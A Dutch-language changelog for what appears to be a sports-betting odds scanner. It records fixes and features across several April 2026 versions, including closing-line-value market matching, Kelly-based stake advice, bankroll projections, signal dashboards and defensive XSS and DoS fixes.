- **Modal odds-aanpassing bug**: bij **lagere** odds gaf de modal een HOGER unit-advies omdat het op pure Kelly rekende terwijl scanner-dampings (market multiplier, new-season, risk gates) weggevallen waren. Voorbeeld: scanner 1.91 → 0.75U, user vult 1.80 in → modal zei 1U. Klopt niet — lagere odds = minder waarde = lager advies.
- **"✓ Gelogd" chip verdween na hard-refresh**: race tussen `loadScanHistory()` (rendert picks) en `loadBets()` (vult `betData`). Renderen gebeurde met `betData=null` → alle picks toonden "+ Log" knop ook voor al gelogde bets. Nu re-render na loadBets() complete.

### Added
- **4-tier modal line-move logica** (via nieuwe `/lib/modal-advice.js`):
  - **Ongewijzigd (±2%)** → scanner-advies behouden
  - **Licht (-2 tot -4%)** → origUnits × kelly-ratio, floor naar bucket (minstens 1 bucket lager)
  - **Matig (-4 tot -6%)** → helft van scanner-advies + ⚠️ warning
  - **Adverse (>-6%)** → 🚫 "Line moved — pick niet meer valide" + **0U aanbevolen**
  - **Stijging (>+2%)** → pure Kelly gecapt op origUnits
  Rationale: een grote adverse line-move is een sterk reverse-CLV signaal (bookie moved prijs vanwege sharp money op andere kant → ons model overschatte edge).
- **Auto-refresh scan-history** op tab-focus (`visibilitychange`) + 5min interval terwijl tab zichtbaar. Detecteert nieuwe scans via timestamp-vergelijk, renders automatisch met "· vers" marker. Geen hard-refresh meer nodig.

### Tests
9 nieuwe tests in `test.js` voor 4-tier modal advice + Padres scenario (1.91→1.80) edge case. Totaal **249 tests, 0 failed** (was 240).

### Docs
- **Info-tab up-to-date** voor alle v10.8.0-9 features: knockout/aggregate score, rest-days alle 6 sporten, new-season damping, signal performance dashboard, projections met regression-to-mean + safe ladder, 18 market buckets, 9-bucket unit ladder, modal 4-tier line-move. Inzetstrategie-card uitgebreid van 6 naar 9 buckets.

## [10.8.8] - 2026-04-15

### Fixed (code review v10.8.0-7 findings)
- **Notification dedup**: was alleen op `type` → unit_increase met verschillende doelwitten werd silent gesuppressed. Nu dedup op `type+title+30d-window` → user krijgt geüpdate alert als doelwit verandert.
- **Backfill-signals mutex**: `_backfillSignalsInProgress` voorkomt concurrent calls die race conditions / dubbele writes opleveren.
- **€3k milestone off-by-one**: findIndex met `i > 0` filter zodat baseline (M0) niet als milestone telt.
- **localStorage dismiss expiry**: dismissed model-alerts hadden onbounded growth + cap=500 zou silent oude verwijderen. Nu `{key, ts}` format met **30-dag auto-cleanup** + cap=1000. Migratie van legacy flat-array format.
- **XSS escape op _setProjTab label**: voorheen alleen single-quote escape, nu ook double-quote.
- **Bookie-radar threshold €150** toegevoegd tussen €50 en €200 (Bet365 NL begint hier al te kijken).

### Added (Vooruitzichten + Acties — v10.8.6/.7)
- **Maand-voor-maand timeline tabel** met clickable scenario tabs (Pess/Verwacht/Opt). Toont per maand: bankroll | unit | stake/bet | maandwinst | cum. winst.
- **€3k milestone marker**: highlight in groen + banner zodra eerste maand €3k+ winst bereikt.
- **Bookie-radar markers** in unit-kolom: 🟡 €50+ · 🟠 €150+ · 👁️ €200+ · ⚠️ €500+ · 🚨 €1000+
- **Toggle Aggressief (10%) ↔ Safe ladder** mode. Safe ladder past unit-rule aan per niveau:
  - <€100 → 10% rule (onder bookie radar)
  - €100-300 → 5% (mainstream safe)
  - €300-500 → 3%
  - >€500 → 2% (professioneel)
- **Inbox filter "🚨 Acties"** voor actionable alerts (highlighted met accent border).
- **evaluateActionableTodos uitgebreid** met:
  - `unit_increase` — bij groeiende bankroll volgens safe-ladder rule
  - `bookie_diversify` — vanaf unit €200: spreid over 2-3 bookies
  - `cashout_advice` — vanaf unit €500: €3k-rule cashout strategie

### Changed (regression-to-mean ROI in projections — v10.8.5)
Sharp bettors halen long-term 5-7%, world-class 10%. 15%+ over <100 bets is bijna zeker run-good. Projection blendt nu observed met 5% prior:
```
weight = min(N/100, 1)
effROI = weight × observed + (1-weight) × 0.05
```
Bij 27 bets met 15.3% observed → effective 7.79%. Disclaimer in UI: "geblend met 5% prior wegens kleine sample n=X".

### Tests
4 nieuwe regression tests: safe-ladder thresholds, bookie-radar levels, regression-to-mean blend math, dismissed-alerts expiry. Totaal **240 tests, 0 failed** (was 235).

## [10.8.0] - 2026-04-15

### Added (Vooruitzichten / projections kaart op Data-pagina)
Nieuwe "🔮 Vooruitzichten" kaart toont bankroll-projectie met compounding over 1/3/6/12 maanden. Drie scenarios (pessimistisch 0.5× ROI / verwacht 1.0× / optimistisch 1.5×). Bevat unit-size advies bij gegroeide bankroll. Aannames (bets/maand, avg inzet) expliciet getoond.

### Added (Model-tab: market multipliers in tabs per sport)
- Tab "🕑 Recent": top 5 meest-recent-gewijzigd cross-sport (o.b.v. modelLog)
- Tabs per sport: Voetbal / Basketbal / Hockey / Baseball / NFL / Handbal
- Fallback bij geen modelLog: sorteer op biggest `|multiplier - 1|`

### Added (Changelog collapse)
Info-pagina was gigantisch. Nu toont default laatste 3 versies expanded, oudere versies achter "Toon X oudere versies" button.

### Added (PWA update toast)
Na SW auto-update reload nu zichtbare toast "✅ Geüpdatet naar vX.Y.Z" (3 seconden). Voorheen silent reload — gebruiker wist niet dat er iets gebeurde.

### Added (Humanizer voor alle markten + sporten)
Eerder werkte alleen voor football ML. Nu ook:
- **BTTS** (yes/no + GF pattern)
- **Over/Under** + TeamStats adjustment
- **Aggregate** (leader vs trailer language)
- **Baseball**: run differential + H/A split + pitcher
- **NBA/NHL**: back-to-back
- **NFL**: bye week
- **NHL**: shots differential
- **Streak** detection
Fallback "Modelanalyse:" opener als geen specifieke keyword matched maar wel facts.

### Added (Retroactieve signal backfill)
`POST /api/admin/backfill-signals` matcht oude bets → `pick_candidates` table via fixture_id + odds/bookie, en vult de lege `signals` kolom. DoS-cap op 500 per call. Nu heeft Signal Performance dashboard ook data voor historische bets.

### Added (Signals meegestuurd bij bet-log via modal)
Bug-fix: modal logde bets zonder signals. Nu wordt `modalPick.signals` meegestuurd zodat nieuwe bets direct in Signal Performance verschijnen.

### Fixed (Tracker inzet formatting)
Tracker toonde "€18" bij 0.75U × €25 = €18.75. JS `Number(18.00).toString()` droopt trailing zeros. Nu expliciet `.toFixed(2)` in tracker + modal.

### Fixed (Aggregate leg-detection zonder expliciete suffix)
Api-sports returnt vaak "Semi-finals" zonder "1st/2nd Leg" suffix. Oude regex faalde → `knockout: 2 (1e leg 0, 2e leg 0)` in telemetrie. Nu H2H broader candidate-matching: zelfde season + FT status + binnen 30 dagen + stage-match.

### Fixed (Debug endpoint: date/status/league info)
`/api/debug/odds` returnt nu ook `dateUTC/dateNL/status/league`. Gaf eerder verkeerde match (FT i.p.v. NS) bij team-name queries.

### Changed (Race-condition mutex op rebuild-calib)
`_calibRebuildInProgress` mutex voorkomt dat gelijktijdige calls corrupte calib-state veroorzaken. Parallel scans krijgen nog steeds 10s cache — maar rebuild zelf is nu exclusief.

### Changed (Signal parsing gestandaardiseerd)
`parseBetSignals()` helper in server.js handelt alle schema-varianten af (jsonb array, text JSON, null, undefined, invalid). Eerder waren er 5+ verschillende parse-paden die inconsistent faalden.

### Changed (afCache.lastPlayed daily reset)
Null-cache (team onbekend) bleef permanent — over multi-day scans raakte data stale. Nu dagelijkse reset via setInterval.

### Changed (Version bump 10.7.x → 10.8.0)
Minor bump gerechtvaardigd: 20+ nieuwe endpoints/features sinds v10.7.19 (rest-days signal, knockout awareness + aggregate score, new-season damping, signal performance dashboard, market tabs, projections, retro backfill, humanizer extensions, PWA updates).

### Tests
4 nieuwe regression tests: projection compounding math, scenarios factor lineariteit, parseBetSignals schema-varianten, humanizer BTTS/Aggregate/baseball tokens. Totaal **235 tests, 0 failed** (was 231).

### Volgende / open
- Info-tab databronnen + model-uitleg update (pending — nu niet actueel t.o.v. v10.8.0 features)

## [10.7.25] - 2026-04-15

### Added (aggregate-score Phase 2 — return-leg edge)
Bouwt verder op v10.7.23 knockout-awareness. Bij detectie van 2e leg fetchen we nu de **1e leg score via H2H endpoint**, berekenen aggregaat en passen EV aan op Over 2.5 en BTTS markten.

**Helpers:**
- `fetchAggregateScore(hmId, awId, roundStr, season)` — zoekt 1e leg via H2H `/fixtures/headtohead?h2h=X-Y&last=5`, filtert op `1st Leg` + zelfde seizoen. Herkent dat home/away gedraaid zijn in de 2e leg.
- `buildAggregateInfo(aggHome, aggAway)` — bouwt signalen + note. Detecteert all-square, small lead (1), big lead (≥2).

**Signalen** (weight=0 default, auto-promote via CLV):
- `leg2_all_square` / `leg2_home_leads_agg` / `leg2_home_leads_big` / `leg2_away_leads_agg` / `leg2_away_leads_big`
- `aggregate_push_ou` / `aggregate_push_btts` (direct effect signalen)

**Direct effect op probabilities** (research-backed, niet wachten op CLV-bewijs):
- **Over 2.5**: +2% per deficit-goal, cap +4%. Trailer moet scoren → meer goals.
- **BTTS**: +2% bij deficit=1, +3% bij deficit≥2 (cap). Leader scoort vaak ook op counters.
- **ML**: geen auto-adjustment (leader wint vaak alsnog ondanks defensiever spel).

**Human-note**: `🏆 Aggregaat thuis leidt 3-2`. Humanizer vertaalt: "thuis verdedigt voorsprong" / "uit moet minstens 2 scoren voor verlenging".

### Added (new-season indicator — B)
Vroeg in seizoen (ronde 1-4) is form/h2h minder predictief door kleine sample. Nu:
- Detectie via `f.league.round` matcht `Regular Season - N` met N≤4
- Signaal `early_season` (logging)
- **Dempt form + h2h adjustments met factor 0.6** (research: form-signal is 40% minder predictief in eerste weken)
- Injuries + congestion blijven ongedempt (die gelden direct)
- Note `🌱 Vroeg in seizoen (ronde X)` in reason

### Added (signal performance dashboard — D)
Nieuwe Model-tab kaart "Signal Performance" toont per signaal:
- `n` (aantal bets met dit signaal)
- `avgClv` + kleur (groen/rood)
- `posCLV_pct` (% bets met positieve CLV)
- Huidige `weight` (0.0-1.5)
- Status: 🚀 auto_promotable / ✅ active / 📈 logging_positive / 👁️ logging / 🔴 mute_candidate

**Endpoint:** `GET /api/admin/signal-performance`
Response include ook thresholds zodat UI de drempels toont.

### Tests
4 nieuwe regression tests: aggregate-score signals, Over/BTTS adj berekening, new-season detectie, damping-factor. Totaal **231 tests, 0 failed** (was 227).

### Waarom deze drie samen
- **A** levert direct meetbare edge op (geen CLV-wachttijd)
- **B** verlaagt risico op slechte picks in seizoenstart
- **D** geeft transparantie: je ziet live welke signalen werken en wanneer ze promoveren

## [10.7.24] - 2026-04-15

### Added (rest-days signal — alle 6 sporten)
Tussen wedstrijden verstreken dagen als signaal, met sport-aware thresholds:
- **NBA / NHL**: <2 dagen = tired (back-to-back)
- **NFL**: <4 dagen = short week (Thursday Night effect)
- **Football**: <3 dagen = midweek (na CL/EL impact)
- **MLB / handbal**: <1 dag = tired

**Signalen** (weight=0 default, auto-promote via `autoTuneSignalsByClv` bij positieve CLV over ≥20 samples):
- `rest_days_home_tired` / `rest_days_away_tired` — absoluut flag bij team onder threshold
- `rest_mismatch_home_advantage` / `rest_mismatch_away_advantage` — als verschil ≥3 dagen

**Human-note** in pick reason: `🛌 rust: thuis 1d / uit 3d`

**humanizePickReason** vertaalt naar: "thuis op korte rust, uit fris" of "uit op korte rust, thuis fris" of "groot verschil in rustdagen tussen teams".

**Helper** `fetchLastPlayedDate(sport, cfg, teamId, kickoffMs)`:
- Cached per (sport, teamId) binnen scan-session
- Null-cached ook (voorkomt herhaalde failed calls)
- ~80ms sleep tussen calls voor rate-limit respect

**API-kosten**: ~2 extra calls per fixture (1 per team), gedecupliceerd per scan. Budget impact ~100-200 calls/dag totaal over alle sporten (binnen 7500/dag budget).

### Fixed (CLV milestone spam)
`_lastClvAlertN` leefde alleen in-memory → elke deploy → eerste health-check triggert milestone weer. Nu gepersisteerd in calibration store. Bij eerste init na deploy: snap naar `floor(count/25)*25` zodat we niet retroactief milestones vuren.

### Fixed (debug endpoint: include date/status/league)
`/api/debug/odds` gaf alleen id/home/away/bookmakers. Voor de Padres-diagnose bleek dat een FT-match (afgelopen nacht) werd getoond ipv de aankomende NS-match. Nu ook: `dateUTC`, `dateNL` (Europe/Amsterdam), `status.short`, `league.name`. Geen bugfix maar UX van admin-tool.

### Fixed (duplicate hmId declaration in football scan loop)
Tijdens rest-days wire-up kreeg de football-loop `const hmId = f.teams?.home?.id` toegevoegd, wat conflicteerde met verderop `const hmId = hmSt?.teamId`. Latere declaration hernoemd naar `hmIdResolved` met fallback.

### Tests
1 nieuwe test voor rest-days signal logica (NBA back-to-back, NFL short week, football midweek, missing data). Totaal **227 tests, 0 failed**.

## [10.7.23] - 2026-04-15

### Added (knockout / 2-leg tie awareness — v1: logging)
Champions League, Europa League, Conference League, domestic cups. `f.league.round` bevat nu strings zoals "Round of 16 - 1st Leg", "Quarter-finals 2nd Leg", "Semi-finals", "Final". Parser extraheert:
- `leg` (1 of 2)
- `stageLabel` (finale / halve finale / kwartfinale / 1/8 finale / 1/16 finale)
- `isKnockout` (boolean)

**Wat er gebeurt nu:**
- Signalen toegevoegd: `knockout_1st_leg`, `knockout_2nd_leg`, `knockout_final`, `knockout_semi`, `knockout_quarter`. Allemaal weight=0 default. Auto-promote via `autoTuneSignalsByClv` zodra ≥20 bets met positieve CLV verzameld.
- Reason-string krijgt `🥊 2e leg kwartfinale` note.
- `humanizePickReason` (pick-kaart analyse) vertaalt naar "return leg — aggregaatstand speelt mee" of "heenwedstrijd van 2-leg tie".

**Wat NIET in v1:**
- Aggregate score adjustment: als team +2 op aggregaat staat gaan ze vaak conservatief spelen. Dat vereist api-call per fixture om 1e leg score op te halen. Phase 2.
- Away-goals rule (afgeschaft door UEFA 2021, maar domestic cups soms nog).

### Fixed (Padres ML dedupe — user-reported)
Padres scan gaf Unibet 1.88 terwijl Bet365 1.90 had. Twee oorzaken:
1. `parseGameOdds` matchte ML strikt op `bet.id===1`. Sommige bookies leveren Match Winner onder andere ID, alleen herkenbaar via naam ("Match Winner", "Home/Away", "Moneyline"). Nu naam-fallback.
2. Dedupe nam LAAGSTE prijs per bookie voor alle markten. Correct voor spread/totals (alt-lines hebben hogere prijzen), maar WRONG voor ML/DC/DNB/3way/NRFI/oddEven — die hebben geen alt-concept. Nu split: `dedupeMainLine` (lowest) voor spread/totals, `dedupeBestPrice` (highest) voor ML e.d.

### Fixed (remaining silent catches — debuggability)
14 stille catch blocks hebben nu minstens console.warn met context: pre-fetch fixtures, standings/injuries/referees enrichment, why-this-pick signal parsing, scan user-prefs load, pre-kickoff odds fetch, scan history load, analyze live-status check, Supabase RPC fallback, unit Telegram sends, market-samples refresh, loadSignalWeightsAsync. Functioneel gedrag onveranderd, alleen betere diagnose bij crashes.

### Tests
3 nieuwe regression tests: knockout-round parser, ML dedupe invariant, Padres-scenario reproduction. Totaal **226 tests, 0 failed** (was 215).

## [10.7.22] - 2026-04-15

### Security / Fixed (code-review bevindingen)
- **XSS fix**: `humanizePickReason()` output en raw `p.reason` nu ge-escaped vóór innerHTML. Voorheen konden teamnamen/refs met HTML-tekens ongefilterd in de DOM landen.
- **minDeltaPct validatie** (`/api/clv/recompute`): NaN/Infinity/negatief/>100 verworpen. Voorkomt silent no-ops (Infinity) of resource exhaustion (NaN).
- **DoS-cap**: `/api/clv/recompute` en `/api/admin/rebuild-calib` limieten nu op 10k bets per call. Response bevat `capped:true` als cap bereikt.

### Fixed (CLV resolver robustness)
- `findByNames()` skipt nu bets met lege values zodat eerste naam-match niet stille null retourneert als een andere entry wél data heeft. Regression test toegevoegd.
- Null-safe op bk, markt, values (tests voor alle edge cases).

### Fixed (rebuild-calib gedragsverbeteringen)
- **Behoudt multiplier als prior**: voorheen reset elke rebuild de multiplier naar 1.0 en verloor je opgebouwde tuning (50+ bets werk weg). Nu gebruikt ie de huidige waarde als prior, past de shared `computeMarketMultiplier` formule toe. Optionele `{resetMultipliers:true}` body om forceren.
- **Rebuild `leagues` aggregate**: voorheen stale na split. Nu opnieuw opgebouwd uit settled bets.
- **Gedeelde formule** (`computeMarketMultiplier`): één bron van waarheid voor `updateCalibration` én rebuild. Voorheen divergeerden ze (rebuild hardcoded 0.70/1.10, incremental graduated).
- **Post-rebuild refresh**: `refreshMarketSampleCounts()` wordt automatisch getriggerd zodat scan meteen met nieuwe counts werkt.

### Fixed (scan crashes + silent catches)
- **Scan-crash na rebuild-calib** (`cm.home.multiplier` TypeError): legacy scan-code las ongeprefixte keys die na rebuild niet meer bestonden. Nu backfill van ongeprefixte keys via `mm()` helper.
- **Surface real scan errors**: `runPrematch .catch` toonde generic "Scan mislukt" en slikte stack trace. Nu logs volledige stack + emits detail.
- **Drawdown protection fail-safe**: catch returnde 1.0 (volle stakes) bij crash. Nu 0.6 (voorzichtiger) + console.error.
- **loadCalibAsync**, **Kelly stepup notification**, **CLV backfill fixture_id updates**, **keep-alive ping**, **enrichment data writes**: alle stille catches nu minstens `console.error/warn` met context.

### Fixed (UI/UX)
- **Bet-edit modal: sport auto-fill**: voorheen viel hockey/nfl/handball via ontbrekende i18n keys terug op "Voetbal". Nu hardcoded map naar option labels + `sportSel.value` (ipv iterate options).
- **Bet-edit modal: units bij odds-daling**: bij lagere odds capt de recommender niet meer op origUnits. Fijner getrapte bands (0.2 / 0.3 / 0.4 / 0.5 / 0.75 / 1.0 / 1.5 / 2.0). Score gebruikt nu `freshScore` bij odds-daling.
- **Inzet formatting**: modal toont nu hele getallen zonder `.00` — match de tracker. Alleen decimalen als echt nodig.
- **Per-sport labels in Model tab**: fallback naar hardcoded Dutch namen bij ontbrekende `sport_*_full` i18n keys (voorheen toonde UI letterlijk "sport_hockey_full").

### Added (analyzer tab krijgt humanized narrative)
`renderAnalysisResult` toont nu de zelfde natuurlijke analyse-tekst als pick-card in scan-tab. Raw reason blijft onderaan als detail.

### Removed (dead code)
- `lib/calibration.js` — 434 regels parallel-implementatie die nergens geïmporteerd werd. Bevatte stale `detectMarket()` met 6 buckets (pre-v10.7.21). Verwijdering voorkomt toekomstige divergentie als iemand het per ongeluk importeert.

### Tests
9 nieuwe regression tests: CLV resolver null-safety (3), detectMarket nieuwe buckets (2), multiplier-formule (1), minDeltaPct validatie (1), XSS escape (1), modal recUnits bij odds-daling (1). Totaal **224 tests, 0 failed** (was 215).

## [10.7.21] - 2026-04-15

### Added (humanized pick-reasoning in analyse-tab)
Nieuwe `humanizePickReason()` parseert de technische reason-string (Consensus, Form, Injuries, Referee, Weather, Stakes) naar 1-2 natuurlijke zinnen die bovenin de analyse-uitklap staan. Technische details blijven eronder voor de power-user. Geeft een leesbare onderbouwing per pick zonder signals/weights/model-details weg te geven.

### Added (auto-sync CHANGELOG.md → in-app)
`GET /api/changelog` parseert `CHANGELOG.md` server-side en levert JSON (version/date/sections). In-app Versiegeschiedenis kaart rendert dit dynamisch (admin-only voor nu). Fallback naar hardcoded lijst bij load-failure. Eén source of truth.

### Fixed (PWA auto-update zonder reinstall)
Service worker luistert nu naar `SKIP_WAITING` message. Client roept `reg.update()` aan op elke page-load; nieuwe SW activeert zichzelf en triggert een `controllerchange` → auto-reload. Geen delete/reinstall meer nodig voor nieuwe deploys.

### Changed (PWA theme = system default)
Default theme volgt `prefers-color-scheme`. Gebruiker kan expliciet overriden via de dark-toggle; die keuze wint totdat localStorage wordt gewist. Live-update bij system theme change als er geen override staat.

### Changed (daily results check 06:00 → 10:00 Ams)
Verschoven ivm late US/MLB wedstrijden die pas diep in de nacht eindigen — 06:00 miste die regelmatig. Dagoverzicht bevat nu ook alle settled bets van de laatste 24h, niet alleen de nog-open bets die nu net afgesloten zijn. Voorheen zag je vaak maar 1 wedstrijd; nu volledige nacht + vorige dag.

### Fixed (notif sticky bug)
`toggleNotif()` wachtte niet op mark-read. Race condition liet 1 notif sticky staan na her-open. Nu `await` op mark-read voordat loadNotifications draait.

### Changed (API usage meter = football-specifiek)
Home meter toonde totaal-over-alle-sport-hosts. Nu expliciet football-host usage (= verreweg de grootste verbruiker door fixtures, injuries, refs, weather, predictions, standings, stats). Dat is de echte bottleneck.

### Added (CLV-knop feedback bij lege lijst)
`clvBackfill()` gaf vroeger gewoon "0 ingevuld" bij lege candidate-lijst. Nu expliciet: "Geen bets met lege CLV gevonden — gebruik Hercomputeer in admin-tab als je bestaande waarden wil herzien". Ook console-log van failures bij non-zero kandidaten.

### Changed (`football_other` vangbak opgesplitst)
`detectMarket()` classificeerde BTTS, DNB, Double Chance, Spread/Run Line/Puck Line, NRFI/YRFI, Team Totals en Odd/Even allemaal onder `other`. Effect: kill-switch en markt-multipliers konden geen aparte beslissing nemen per markttype. Ook: hockey/baseball markten verdwenen hier massaal in één `hockey_other` / `baseball_other` bucket.

Nu eigen bucket per type:
- `btts_yes`, `btts_no`
- `dnb_home`, `dnb_away`
- `dc_1x`, `dc_x2`, `dc_12`
- `spread_home`, `spread_away` (incl. Run Line / Puck Line / Handicap)
- `nrfi`, `yrfi`
- `team_total_over`, `team_total_under`, `team_total`
- `odd`, `even`
- Bestaande: `home`, `away`, `draw`, `home60`, `away60`, `draw60`, `over`, `under`

### Added (rebuild-calib endpoint)
`POST /api/admin/rebuild-calib` herbouwt `c.markets` vanaf 0 door alle admin settled bets opnieuw te classificeren met de nieuwe `detectMarket`. Body `{ dryRun:true }` laat de diff zien zonder te schrijven. Nodig om historische `football_other` op te splitsen naar de nieuwe buckets.

### Added (UI bucket-labels)
`renderInboxMarkets` (Model tab) kent alle nieuwe bucket-keys en toont per markt: BTTS Ja/Nee, DNB home/away, Dubbele 1X/X2/12, Spread/Handicap home/away, Team Over/Under, NRFI/YRFI, Odd/Even, 60-min varianten.

### Volg-upstappen voor user
1. Deploy.
2. `POST /api/admin/rebuild-calib` met `{dryRun:true}` → zie de diff (welke `_other` bets waar heen gaan).
3. Daarna `{dryRun:false}` → schrijft nieuwe calibratie. Kill-switch / markt-multipliers werken nu per specifieke markt.

### Tests
7 nieuwe `detectMarket` regression tests (BTTS, DNB, DC, Spread, NRFI/YRFI, Team Totals, onbekend-blijft-other). Totaal 215 tests, 0 failed.

## [10.7.20] - 2026-04-15

### Fixed (CLV market matching — root cause foute CLV%)
De oude `fetchCurrentOdds` matchte markten veel te los met `.includes('over')`, `.includes('winner')`, `.includes('spread')` etc. Gevolgen gezien op 2026-04-14:

- **Wigan ML @ 1.83 Unibet**: slotlijn kwam binnen als 1.83 → CLV 0% ❌. Werkelijke Unibet Home slot was 1.57 → **echte CLV +16.6%** ✅. Oude code pakte vermoedelijk een Alt/1st-half Winner ipv hoofdmarkt.
- **Chesterfield Over 2.5 @ 1.90 Bet365**: slotlijn kwam binnen als 1.95 → CLV -2.56% ❌. Bet365 Match Goals Over 2.5 sloot op 1.83 → **echte CLV +3.83%** ✅. Waarschijnlijk Corners O/U 2.5 of Alt Total 2.5 gepakt.
- **DNB bets** werden misgeclassificeerd als ML omdat de `🏠/✈️` emoji al door de ML-tak gevangen werd vóór de DNB-tak bereikt werd.

**Fix** (`lib/clv-match.js` — nieuwe pure resolver, testbaar zonder API):
1. O/U: vereist nu dat bet BEIDE `Over <line>` én `Under <line>` heeft, en filtert non-main via regex (`/alt|corner|card|team total|1st|period|...etc/`).
2. ML: exacte naam-match (`Match Winner`, `Home/Away`, `Winner`, etc.) ipv `.includes('winner')`. Accepteert ook `"1"/"2"` value-conventie.
3. DNB/Draw/BTTS checks **vóór** ML (emoji-vangnet bug).
4. Spread/Run Line/Puck Line filtert non-main (alt, corners, halftime, team totals).
5. `bet.id` niet meer hard-coded (varieert per sport) — name match is leading.

### Fixed (pre-kickoff odds notif — verkeerde bookie)
`schedulePreKickoffCheck` riep `fetchCurrentOdds` zonder `strictBookie:true`. Bij bookie-mismatch viel ie stil terug op Bet365 of eerste bookie → "odds stabiel" werd vergeleken met compleet andere book. Nu strictBookie overal.

### Fixed (CLV notif bookie display)
`usedBookie = bet.tip || 'Bet365'` toonde "Bet365" default als bookie ontbrak. Nu 'onbekend'.

### Added (retro CLV recompute endpoint)
`POST /api/clv/recompute` forceert hercomputatie voor ALLE settled bets. Body:
- `all: true` (admin: ook andere users)
- `dryRun: true` (geen writes, alleen rapport)
- `minDeltaPct: 0.5` (skip updates <0.5%-punt verschil — meet-ruis).

Na recompute draait automatisch: `refreshKillSwitch`, `autoTuneSignalsByClv`, `evaluateKellyAutoStepup` op de gecorrigeerde CLV-data. Zo werken kill-switch, signal-weights en Kelly-stepup op correcte cijfers. CLV-milestones + ROI-stats in tracker updaten automatisch op nieuwe clv_pct.

### Added (13 CLV regression tests)
`test.js` nu 208 tests. Dekt alle gefixte cases: Alt-market fallback, Corners O/U 2.5 fallback, DNB-emoji bug, BTTS, NRFI, Run Line main-lijn, 1st Half scheiding, 60-min 3-way hockey, `bet.id` onafhankelijkheid, "1"/"2" value-conventie, en null-return bij onbekende markten.

### Volg-upstappen voor user
1. Deploy (auto via push).
2. Eerst `POST /api/clv/recompute` met `{dryRun:true}` (admin) → zie verschilrapport.
3. Daarna `{dryRun:false}` → schrijft nieuwe clv_pct + draait tuning.

## [10.7.14] - 2026-04-14

### Fixed (paired-devig pairing conventie)
`buildSpreadFairProbFns` ging ervan uit dat pairing **altijd opposite-point** was (NBA/NFL conventie: Home -7.5 ↔ Away +7.5). Maar **MLB en NHL gebruiken same-point** (Home -1.5 ↔ Away -1.5, waar "Away -1.5" semantisch "Away side of -1.5 line" = bet-against-home betekent).

**Gevolg in v10.7.13**: paired-devig faalde voor MLB → sanity check tot<1.00 → fallback `fpHome × 0.55` → Dodgers cover-prob op 0.347 ipv realistische 0.447.

**Fix**: probeert BEIDE pairings, kiest die met plausibele vig (1.00-1.15). Lagere vig wint.

**Resultaat**: cover-prob voor MLB Dodgers -1.5 klopt nu met sharp markt (~44.5%). Edge bij 2.17 = ~-3% = terecht geen pick.

### Gevolg voor user
Wat eerder vandaag een "16% edge 7/10 pick" leek, was grotendeels artefact van de score-bug. Correct gekalibreerd is de bet marginaal -EV. Variance beslist over 1 bet. Bet staat, CLV-capture doet werk.

## [10.7.13] - 2026-04-14

### Added (regressietests — voorkomt dat vandaag's bugs terugkeren)
- `dedupe per (bookie, point)`: alt-line hoge prijs wordt weggegooid voor main-line
- `INVARIANT: meer brokers kan nooit picks verwijderen` — core invariant die vandaag was gebroken
- `INVARIANT: single-bookie edge == combi-edge` als best-prijs identiek is
- `per-entry maxOdds filter kill alleen anomalieën` — niet legit entries
- `fairProb als function`: per-point devigged consensus werkt over multiple point-lines

Totaal: 195 tests (was 190).

### Fixed (score bug op NBA + NFL + handball spreads)
Zelfde fout als MLB/NHL: `fpHome` (ML win-prob) werd direct gebruikt voor spread edge, terwijl spread cover strikter is dan winnen. Gaf overstate van edge → score 7/10 op eigenlijk marginale picks.

**Fix**: nieuwe helper `buildSpreadFairProbFns(homeSpr, awaySpr, fallbackH, fallbackA)` die per-point devigged consensus maakt uit paired (Home -X, Away +X) pools. `bestSpreadPick` accepteert nu een function voor `fairProb` — wordt per point-line geëvalueerd. Fallback: `fp × 0.50` als pool te dun of vig out-of-range.

**Toegepast op**: NBA spread, NFL spread + 1st half spread, handball handicap.
Voor MLB/NHL blijft de hardcoded `×0.55` fallback (runline standaard ±1.5, minder punt-variatie).

**Consequentie**: spread-picks tonen nu realistische cover-prob in reason-string (`cover 47.2%` ipv misleidende `63%` ML-prob). Score-tier klopt nu met echte edge.

## [10.7.12] - 2026-04-14

### Fixed (score/edge bug op spread-markten)
MLB run line en NHL puck line gebruikten `fpHome` (moneyline win-prob) direct voor spread edge-berekening. Dat overstelde de edge want "Home wins" ≠ "Home covers -1.5" (winnen met 2+ runs/goals is strikter dan simpelweg winnen).

**Fix**: spread-specifieke devigged consensus uit `(home -1.5, away +1.5)` pool. Als pool te dun / te rare (vig buiten 0-15%), fallback naar `fpHome × 0.55` (historische ML→cover ratio voor MLB/NHL).

**Impact**: edge op run-line / puck-line picks is nu realistisch. Score-mapping via hk blijft, maar hk krijgt correcte input. Geen meer 7/10 picks met eigenlijk marginale edge.

**Gebruiker-bevestiging**: api-sports "-1.5 @ 2.55" = 3-way run line (push als eigen outcome, hogere odds voor strengere conditie). Dedupe-fix (v10.7.10/11) pakt main 2-way line.

## [10.7.11] - 2026-04-14

### Fixed (broader application van v10.7.10 fix)
- De dedupe-bug zat structureel in `parseGameOdds`, niet alleen in spreads. Nu dedupe toegepast in parseGameOdds zelf op ALLE market-arrays: moneyline, totals, spreads, halfML, halfTotals, halfSpreads, nrfi, oddEven, threeWay, teamTotals, doubleChance, dnb.
- Key per markt: `(bookie, side)` voor ML-achtig, `(bookie, side, point)` voor spread/total-achtig, `(bookie, team, side, point)` voor teamTotals.
- Dedupe houdt LAAGSTE prijs = main line. Alt-lines met vals-hoge odds worden overal automatisch weggegooid.

### Rationale
Dezelfde anomalie die Dodgers -1.5 rejecte kan ook Over 8.5 rejecten als Bet365 een alt Over 8.5 @ hogere odds aanbiedt, of half-spreads, enz. Fix bij de bron = afgedekt voor alle toekomstige markten.

## [10.7.10] - 2026-04-14

### Fixed (KRITIEK — Dodgers-mysterie DEFINITIEF opgelost)
Via debug-log uit user's laatste scan bleek: api-sports levert per bookie soms MEERDERE entries op dezelfde spread-point (main line + alternate line). Voor Dodgers home -1.5 had Bet365 zowel @2.10 (main) als @2.55 (alt-line), en 1xbet/Betano ook dupes.

**Bug-chain:**
1. `bestFromArr` pakte max = Bet365 @2.55 (alt-line, anomaal hoog binnen range)
2. Edge berekend op 2.55: 60% (vals-hoog door alt-line conditie)
3. `mkP`: `ep = 1/2.55 + boost = 0.513` < `MIN_EP (0.52)` → REJECTED
4. Legit Unibet @2.17 (edge 37%, ep 0.534 > 0.52) genegeerd

**In Unibet-only mode**: pool filtered tot alleen Unibet entries → alt-line verdwijnt → Unibet 2.17 wint → pick fires.

**Fix**: `bestSpreadPick` dedupeert per `(bookie, point)` met LOWEST price. Main line heeft per definitie lagere odds dan alt-line (strengere win-conditie = langere odds voor alt). Lowest per bookie = main line.

